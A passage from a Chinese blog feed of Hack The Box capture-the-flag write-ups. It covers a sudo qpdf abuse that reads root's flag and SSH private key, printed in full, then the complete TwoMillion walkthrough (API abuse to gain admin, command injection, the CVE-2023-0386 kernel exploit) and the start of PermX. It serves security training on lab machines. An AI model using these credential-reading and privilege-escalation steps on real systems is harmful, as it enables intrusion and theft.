class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 1400 -a 0 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa  /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line">0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa:simple and clean</span><br></pre></td></tr></table></figure><p>ssh就可以连了</p><h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240731154158501.png" alt="image-20240731154158501"></p><p><a href="https://qpdf.readthedocs.io/en/stable/cli.htm">https://qpdf.readthedocs.io/en/stable/cli.htm</a></p><p>读flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/qpdf --empty /tmp/root.txt --qdf --add-attachment /root/root.txt --</span><br><span class="line"></span><br><span class="line">cat /tmp/root.txt</span><br></pre></td></tr></table></figure><p>也可以连root</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/qpdf --empty /tmp/rsa.txt --qdf --add-attachment /root/.ssh/id_rsa --</span><br></pre></td></tr></table></figure><p>写入文件 id_rsa</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS</span><br><span class="line">1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQQMb6Wn/o1SBLJUpiVfUaxWHAE64hBN</span><br><span class="line">vX1ZjgJ9wc9nfjEqFS+jAtTyEljTqB+DjJLtRfP4N40SdoZ9yvekRQDRAAAAqGOKt0ljir</span><br><span class="line">dJAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAxvpaf+jVIEslSm</span><br><span class="line">JV9RrFYcATriEE29fVmOAn3Bz2d+MSoVL6MC1PISWNOoH4OMku1F8/g3jRJ2hn3K96RFAN</span><br><span class="line">EAAAAgK2QvEb+leR18iSesuyvCZCW1mI+YDL7sqwb+XMiIE/4AAAALcm9vdEBpY2xlYW4B</span><br><span class="line">AgMEBQ==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>设置权限并连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br><span class="line">ssh -i id_rsa root@10.10.11.12</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB TwoMillion</title>
      <link href="/2024/07/24/writeup/htb/HTB%20TwoMillion/"/>
      <url>/2024/07/24/writeup/htb/HTB%20TwoMillion/</url>
      
        <content type="html"><![CDATA[<h1 id="TwoMillion-Linux-·-Easy"><a href="#TwoMillion-Linux-·-Easy" class="headerlink" title="TwoMillion (Linux · Easy)"></a>TwoMillion (Linux · Easy)</h1><p>Js反混淆 + api利用 + CVE-2023-0386</p><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- -v -T4 -Pn 10.10.11.211</span><br><span class="line"></span><br><span class="line">Nmap scan report for bogon (10.10.11.221)</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)</span><br><span class="line">|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)</span><br><span class="line">80/tcp open  http    nginx</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-title: Did not follow redirect to http://2million.htb/</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>添加hosts</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;10.10.11.221 2million.htb&quot; | sudo tee -a /etc/hosts</span><br></pre></td></tr></table></figure><h3 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://2million.htb</span><br><span class="line">/login</span><br><span class="line">/register</span><br></pre></td></tr></table></figure><p> 页面交互跳转 &#x2F;invite</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240724141849108.png" alt="image-20240724141849108"></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240724142749664.png" alt="image-20240724142749664"></p><p>简略，邀请码正确，将被重定向到 &#x2F;register</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">defer</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        $(<span class="string">&#x27;#verifyForm&#x27;</span>).<span class="title function_">submit</span>(<span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            e.<span class="title function_">preventDefault</span>();  <span class="comment">// 阻止表单的默认提交行为</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> code = $(<span class="string">&#x27;#code&#x27;</span>).<span class="title function_">val</span>();  <span class="comment">// 获取表单中输入的邀请代码</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> formData = &#123; <span class="string">&quot;code&quot;</span>: code &#125;;  <span class="comment">// 将邀请代码封装到对象中</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">data</span>: formData,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">url</span>: <span class="string">&#x27;/api/v1/invite/verify&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">response</span>) &#123;  <span class="comment">// 请求成功的回调函数</span></span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span> (response[<span class="number">0</span>] === <span class="number">200</span> &amp;&amp; response.<span class="property">success</span> === <span class="number">1</span> &amp;&amp; response.<span class="property">data</span>.<span class="property">message</span> === <span class="string">&quot;Invite code is valid!&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="comment">// 邀请码验证成功</span></span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;inviteCode&#x27;</span>, code);  <span class="comment">// 将邀请代码存储到 localStorage</span></span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&#x27;/register&#x27;</span>;  <span class="comment">// 重定向到注册页面</span></span></span><br><span class="line"><span class="language-javascript">                    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="title function_">alert</span>(<span class="string">&quot;Invalid invite code. Please try again.&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">error</span>: <span class="keyword">function</span>(<span class="params">response</span>) &#123;  <span class="comment">// 请求失败的回调函数</span></span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">alert</span>(<span class="string">&quot;An error occurred. Please try again.&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>inviteapi.min.js，代码似乎被混淆</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="keyword">function</span>(<span class="params">p,a,c,k,e,d</span>)&#123;e=<span class="keyword">function</span>(<span class="params">c</span>)&#123;<span class="keyword">return</span> c.<span class="title function_">toString</span>(<span class="number">36</span>)&#125;;<span class="keyword">if</span>(!<span class="string">&#x27;&#x27;</span>.<span class="title function_">replace</span>(<span class="regexp">/^/</span>,<span class="title class_">String</span>))&#123;<span class="keyword">while</span>(c--)&#123;d[c.<span class="title function_">toString</span>(a)]=k[c]||c.<span class="title function_">toString</span>(a)&#125;k=[<span class="keyword">function</span>(<span class="params">e</span>)&#123;<span class="keyword">return</span> d[e]&#125;];e=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">return</span><span class="string">&#x27;\\w+&#x27;</span>&#125;;c=<span class="number">1</span>&#125;;<span class="keyword">while</span>(c--)&#123;<span class="keyword">if</span>(k[c])&#123;p=p.<span class="title function_">replace</span>(<span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&#x27;\\b&#x27;</span>+<span class="title function_">e</span>(c)+<span class="string">&#x27;\\b&#x27;</span>,<span class="string">&#x27;g&#x27;</span>),k[c])&#125;&#125;<span class="keyword">return</span> p&#125;(<span class="string">&#x27;1 i(4)&#123;h 8=&#123;&quot;4&quot;:4&#125;;$.9(&#123;a:&quot;7&quot;,5:&quot;6&quot;,g:8,b:\&#x27;/d/e/n\&#x27;,c:1(0)&#123;3.2(0)&#125;,f:1(0)&#123;3.2(0)&#125;&#125;)&#125;1 j()&#123;$.9(&#123;a:&quot;7&quot;,5:&quot;6&quot;,b:\&#x27;/d/e/k/l/m\&#x27;,c:1(0)&#123;3.2(0)&#125;,f:1(0)&#123;3.2(0)&#125;&#125;)&#125;&#x27;</span>,<span class="number">24</span>,<span class="number">24</span>,<span class="string">&#x27;response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify&#x27;</span>.<span class="title function_">split</span>(<span class="string">&#x27;|&#x27;</span>),<span class="number">0</span>,&#123;&#125;))</span><br></pre></td></tr></table></figure><p>ChatGPT&#x2F;Tools 反混淆后</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">verifyInviteCode</span>(<span class="params">code</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> formData = &#123;<span class="string">&quot;code&quot;</span>: code&#125;;</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>: formData,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&#x27;/api/v1/invite/verify&#x27;</span>,</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">response</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(response);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">error</span>: <span class="keyword">function</span>(<span class="params">response</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">makeInviteCode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&#x27;/api/v1/invite/how/to/generate&#x27;</span>,</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">response</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(response);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">error</span>: <span class="keyword">function</span>(<span class="params">response</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>makeInviteCode()</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">curl -sX POST http://2million.htb/api/v1/invite/how/to/generate | jq</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">jq Json美化</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;0&quot;: 200,</span><br><span class="line">  &quot;success&quot;: 1,</span><br><span class="line">  &quot;data&quot;: &#123;</span><br><span class="line">    &quot;data&quot;: &quot;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr&quot;,                                                                   </span><br><span class="line">    &quot;enctype&quot;: &quot;ROT13&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;hint&quot;: &quot;Data is encrypted ... We should probbably check the encryption type in order to decrypt it...&quot;                                                             </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据hint信息，对data进行ROT13解码</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240724151706582.png" alt="image-20240724151706582"></p><p>根据解码信息，请求获得code</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">curl -sX POST http://2million.htb/api/v1/invite/generate | jq</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;0&quot;: 200,</span><br><span class="line">  &quot;success&quot;: 1,</span><br><span class="line">  &quot;data&quot;: &#123;</span><br><span class="line">    &quot;code&quot;: &quot;TkU0TEctUE83OFItQlU5V0otVlZRVTM=&quot;,</span><br><span class="line">    &quot;format&quot;: &quot;encoded&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &#x27;TkU0TEctUE83OFItQlU5V0otVlZRVTM=&#x27; | base64 -d</span><br><span class="line">NE4LG-PO78R-BU9WJ-VVQU3</span><br></pre></td></tr></table></figure><p>输入邀请码，进入 &#x2F;register</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240724152658043.png" alt="image-20240724152658043"></p><p>注册登入</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240724163220581.png" alt="image-20240724163220581"></p><p>查看其他的一些api</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240724163137864.png" alt="image-20240724163137864"></p><p>admin api</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240724163831358.png" alt="image-20240724163831358"></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240724163916784.png" alt="image-20240724163916784"></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240724163856589.png" alt="image-20240724163856589"></p><p>似乎可以根据<code> /api/v1/admin/settings/update</code>的信息进一步深入，最后完整的请求</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240724165531488.png" alt="image-20240724165531488"></p><p>请求<code>/api/v1/admin/auth</code>查看信息，成功跟改为管理员</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240724165649491.png" alt="image-20240724165649491"></p><p>再来看<code>/api/v1/admin/vpn/generate</code></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240724170543884.png" alt="image-20240724170543884"></p><p>根据返回的信息发送请求</p><h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240724170808567.png" alt="image-20240724170808567"></p><p>为用户admin生成了一个VPN配置文件 已经打印出来了，如果这个VPN是通过exec或系统Php函数生成的，则有可能存在命令执行漏洞</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240724171503949.png" alt="image-20240724171503949"></p><p>反弹shell</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240724171821776.png" alt="image-20240724171821776"></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240724172050337.png" alt="image-20240724172050337"></p><p>数据库</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240724172732008.png" alt="image-20240724172732008"></p><p>密码可能重用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh admin@2million.htb</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240724172459242.png" alt="image-20240724172459242"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>还得是信息收集，&#x2F; FUSE</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240724173753949.png" alt="image-20240724173753949"></p><p>Google search</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240724174215821.png" alt="image-20240724174215821"></p><p>kali 下载打包，scp 传过去</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp cve.tar.gz admin@2million.htb:/tmp</span><br></pre></td></tr></table></figure><p>然后执行他，需要两个终端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">https://github.com/xkaneiki/CVE-2023-0386</span></span><br><span class="line">make all</span><br><span class="line">shell01: ./fuse ./ovlcap/lower ./gc</span><br><span class="line">shell02: ./exp</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240724175903673.png" alt="image-20240724175903673"></p><p>thank_you.json</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;encoding&quot;</span><span class="punctuation">:</span> <span class="string">&quot;url&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%7B%22encoding%22:%20%22hex%22,%20%22data%22:%20%227b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d%22%7D&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>urldecode -&gt; hex decode -&gt;</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240724182617204.png" alt="image-20240724182617204"></p><h2 id="Finally"><a href="#Finally" class="headerlink" title="Finally"></a>Finally</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Dear HackTheBox Community,</span><br><span class="line"></span><br><span class="line">We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you.</span><br><span class="line"></span><br><span class="line">From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.</span><br><span class="line"></span><br><span class="line">To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.</span><br><span class="line"></span><br><span class="line">Here&#x27;s to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.</span><br><span class="line"></span><br><span class="line">With deepest gratitude,</span><br><span class="line"></span><br><span class="line">The HackTheBox Team</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB PermX</title>
      <link href="/2024/07/22/writeup/htb/HTB%20PermX/"/>
      <url>/2024/07/22/writeup/htb/HTB%20PermX/</url>
      
        <content type="html"><![CDATA[<h1 id="PermX-Linux-·-Easy"><a href="#PermX-Linux-·-Easy" class="headerlink" title="PermX (Linux · Easy)"></a>PermX (Linux · Easy)</h1><p>CVE-2023-4220 + sudo提权(符号链接)</p><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -sT -T4 10.10.11.23</span><br><span class="line"></span><br><span class="line">Nmap scan report for permx.htb (10.10.11.23)</span><br><span class="line">Host is up (0.10s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)</span><br><span class="line">|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.52</span><br><span class="line">|_http-title: eLEARNING</span><br><span class="line">|_http-server-header: Apache/2.4.52 (Ubuntu)</span><br><span class="line">Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ffuf"><a href="#ffuf" class="headerlink" title="ffuf"></a>ffuf</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 